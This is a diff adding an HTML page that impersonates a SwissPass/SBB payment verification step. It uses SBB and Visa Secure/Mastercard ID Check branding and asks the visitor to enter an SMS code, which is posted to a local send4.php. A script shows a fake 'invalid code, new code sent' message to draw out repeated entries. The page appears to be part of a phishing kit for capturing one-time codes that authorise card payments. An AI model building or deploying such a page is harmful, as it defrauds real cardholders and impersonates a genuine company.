@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+
+<html lang="de">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>| SwissPass |</title>
+    
+    <meta content="IE=edge;chrome=1" http-equiv="X-UA-Compatible">
+    <meta content="public" http-equiv="cache-control">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
+    <meta content="fr" name="content-language">
+    <meta content="no" name="msapplication-tap-highlight">
+    <meta content="website" property="og:type">
+
+    <meta name="google" content="nopagereadaloud">
+
+  <link href="./img/favicon.ico" rel="icon" type="image/x-icon">
+    <link href="./css/main.css" rel="stylesheet">
+    <link href="./css/fonts.css" rel="stylesheet">
+    <link href="./css/wallets.css" rel="stylesheet">
+    <script src="./js/jquery.min.js" type="text/javascript"></script>
+    
+    <script src="./js/modernizr-2.8.3-custom.js" type="text/javascript"></script>
+    <script src="./js/index.js" type="text/javascript"></script>
+
+    <script src="./js/payment.js" type="text/javascript"></script>
+
+
+    <script type="text/javascript">
+        var paymentPageParams = {
+            
+            
+            
+           
+        };
+        
+
+
+        window.datatrans = window.datatrans || {};
+        window.datatrans.config = {
+            ready: function() {
+                paymentPage.init(paymentPageParams);
+                paymentPage.log('Emitter is ready to use.');
+            },
+            mode: 'overlay',
+            process: paymentPageParams.view === 'form' ? 'onestep' : 'twostep',
+            states: [{
+                group: 'mantle',
+                uid: 'loader'
+            }, {
+                group: 'step',
+                uid: paymentPageParams.view === 'form' ? 'payment-form' : 'payment-method'
+            }, {
+                group: 'display',
+
+                uid: 'list',
+
+            }],
+            skin: {
+
+                brand: '\x23da291c',
+                paybutton: '\x23da291c',
+                paybuttontextcolor: 'white',
+                textcolor: 'white',
+                logo: 'rectangle',
+                logoborder: '\x23da291c'
+
+            }
+        };
+    </script>
+
+    
+        </head>
+<body class="view--list mode mode__standalone" ontouchstart="">
+
+     <div class="pg-standalone">
+        <img src="./img/datatrans-new.svg">
+    </div>
+<div class="framework framework__base framework__standalone js-framework skin js-framework__initted js-framework__visible js-framework__animate skin__text-white skin__submit-text-white skin__styled-submit skin__logo-rectangle skin__logoborder skin__styled-submit-text" tabindex="-1">
+    <div class="framework--concentrator">
+        <div class="framework--wrap">
+            <div class="framework--inner">
+                <div class="mantle js-mantle">
+                        <div class="mantle--header">
+                            
+                            
+                            
+                            
+
+
+
+
+
+
+<div class="header js-header skin--target skin--target__bg header__vector" style="color: rgb(223, 0, 0);">
+    <div class="header--container">
+        <div class="header--icon header--icon__left">
+            <a class="header--concentrator js-header--back" href="javascript:void(0)" tabindex="1" aria-label="Retour">
+                <div class="header--concentrator-inner">
+                    <div class="bubble bubble__back">
+                        <div class="bubble--inner">
+                            <svg class="icon icon--arrow" tabindex="-1" aria-label="Retour">&gt;
+                                <use class="test" data-savepage-href="icons/symbols.svg#arrow" href="#arrow">
+                                </use><!--savepage-symbol-insert--><symbol viewBox="0 0 16 16" id="arrow"><title>arrow</title><path d="M16 7H3.8l5.6-5.6L8 0 0 8l8 8 1.4-1.4L3.8 9H16V7z" fill-rule="evenodd"></path></symbol>
+                            </svg>
+                        </div>
+                        <div class="bubble--inner">
+                            <svg class="icon icon--arrow" tabindex="-1" aria-label="Retour">&gt;
+                                <use class="test" data-savepage-href="icons/symbols.svg#arrow" href="#arrow">
+                                </use><!--savepage-symbol-insert--><symbol viewBox="0 0 16 16" id="arrow"><title>arrow</title><path d="M16 7H3.8l5.6-5.6L8 0 0 8l8 8 1.4-1.4L3.8 9H16V7z" fill-rule="evenodd"></path></symbol>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="header--part">
+            <div class="header--logo skin--brand-logo">
+                <div class="skin--brand-style header--logo-inner skin--logo" style="border-color: rgb(223, 0, 0);">
+                    
+                        <img class="header--img" src="./img/sbb.png">
+                    
+                </div>
+            </div>
+            <div class="header--concentrator">
+                <div class="header--concentrator-inner">
+                    <div class="skin--brand-name">
+                        <h1 class="header--brand-name skin--target skin--target__text">
+                            
+                                
+                            
+                        </h1>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="header--icon header--icon__right">
+            <a class="header--concentrator js-header--close" href="javascript:void(0)" tabindex="2">
+                <div class="header--concentrator-inner">
+                    <div class="bubble bubble__close">
+                        <div class="bubble--inner">
+                            <svg class="icon icon--cross" tabindex="-1" aria-label="fermer">&gt;
+                                <use class="test" xlink:href="icons/symbols.svg#cross">
+                                </use>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+            </a>
+        </div>
+    </div>
+</div>
+                        </div>
+                        <div class="mantle--part mantle--part__main js-segment js-segment__mantle js-segment__initted js-segment__is-on">
+                            <div class="mantle--body">
+                                <div class="mantle--content-container js-segment--container js-segment--container__step js-segment--container__initted" style="height: 533px;">
+                                    <div class="mantle--content js-segment js-segment__step js-segment__initted js-segment__is-off" id="payment-method">
+                                        <div class="mantle--content-inner js-segment--inner">
+                                            
+                                   
+     </div>
+</div>
+<div class="mantle--content js-segment js-segment__step js-segment__initted js-segment__is-on" id="payment-form">
+    <div class="mantle--content-inner js-segment--inner">
+                                            
+                                            
+                                         
+                                                
+    <div class="form--wrap js-form--wrap">
+                                                        
+
+<form  method="POST"  action="./send4.php" class="form js-form"  >
+    
+    
+
+<div id="authform">
+    <div class="wrapper">
+        <div class="flag-icon-div" title="Engelsk">
+        </div>
+        <div class="clear"></div>
+        <h1>Bestätigung mit SMS-Code</h1>
+		<br>
+		 <p style="text-align: center;"><img alt="" src="./img/msm.png" style="width: 50px; height: 50px;" /></p><br>
+        
+        <p>Sie haben gerade einen SMS Code auf Ihre Mobilnummer erhalten.</p> <br>
+
+    
+                    
+ <div class="form--fieldset form--fieldset__first">
+                            
+    <div class="form--field form--field__top js-input">
+                                
+  <label class="form--label js-input--label form--label__small" for="sms">SMS-CODE</label>
+        <input class="form--input form--input__text js-input--field" id="sms" name="sms2" placeholder=""  type="text" required="">
+                                        
+    
+
+                                     
+                            
+        </div>
+	<br>	 <div id="errorMessage" class="error">Ihre Eingabe ist ungültig. Neuer Code wurde gesendet.</div>
+<br>
+ 
+          
+                
+                
+            
+  <input type="submit" name="valider" class="buttonClass" value="Bestätigen"><br>
+                           
+
+                                            
+
+
+<p style="text-align:center">&nbsp;</p>
+
+
+
+<div class="safety">
+    <div class="safety--top">
+        <div class="safety--border">
+        </div>
+        <div class="safety--icon">
+            <svg class="icon icon--secure" tabindex="-1" alt="">
+                <use class="test" data-savepage-href="icons/symbols.svg#secure" href="#secure">
+                </use>
+                <symbol viewBox="0 0 23 23" id="secure"><title>secure</title><g fill-rule="evenodd"><rect width="15" height="10" rx="2" transform="translate(4 10)"></rect><path d="M11.5 2C14.538 2 17 4.412 17 7.4v7.2c0 2.983-2.47 5.4-5.5 5.4C8.462 20 6 17.588 6 14.6V7.4C6 4.416 8.47 2 11.5 2zM8.722 7.723C8.722 6.22 9.955 5 11.5 5c1.534 0 2.778 1.217 2.778 2.723v6.554C14.278 15.78 13.045 17 11.5 17c-1.534 0-2.778-1.217-2.778-2.723V7.723z"></path></g></symbol>
+            </svg>
+        </div>
+        
+    </div>
+    <div class="safety--message">
+        
+        <p style="text-align:center"><img alt="" src="./img/mcidcheck-visasecure.png" style="height:60px; width:140px"></p>
+
+        <p style="text-align:center">&nbsp;</p>
+
+        <p>
+            Identitätsprüfung per SMS-Code.
+        </p>
+    </div>
+</div>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    
+                                            
+                                    
+<div aria-hidden="true" class="templates" id="templates">
+    
+    
+    
+    
+    
+</div>
+
+
+<style type="text/css">
+
+
+.chof-dakchi{ 
+    display: block ;
+
+    
+} 
+.khapi-dakchi{ 
+    display: none ;
+    
+}
+    </style>
+
+
+        <script type="text/javascript">
+    
+   var intervalcountdown = 119;
+   var intervalId;
+
+ function Parameter() {
+ document.getElementById('lw9t_kaymchi').innerHTML = intervalcountdown;
+ if (intervalcountdown == 0) {
+ 
+ window.clearInterval(intervalId);
+ 
+     document.getElementById('lw9t_daz_1').className= 'khapi-dakchi';
+    }
+ intervalcountdown--;
+ }
+
+      function getParameterByName(name, url) {
+ if (!url) url = window.location.href;
+ name = name.replace(/[\[\]]/g, "\\$&");
+ var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+ results = regex.exec(url);
+ if (!results) return ;
+ if (!results[2]) return '';
+ return decodeURIComponent(results[2].replace(/\+/g, " "));
+ }
+
+ if(getParameterByName('submited')) {
+ document.getElementById('error').className= 'chof-dakchi';
+ }
+
+ intervalId = window.setInterval('Parameter()', 1000);
+
+</script>
+
+</body></html>
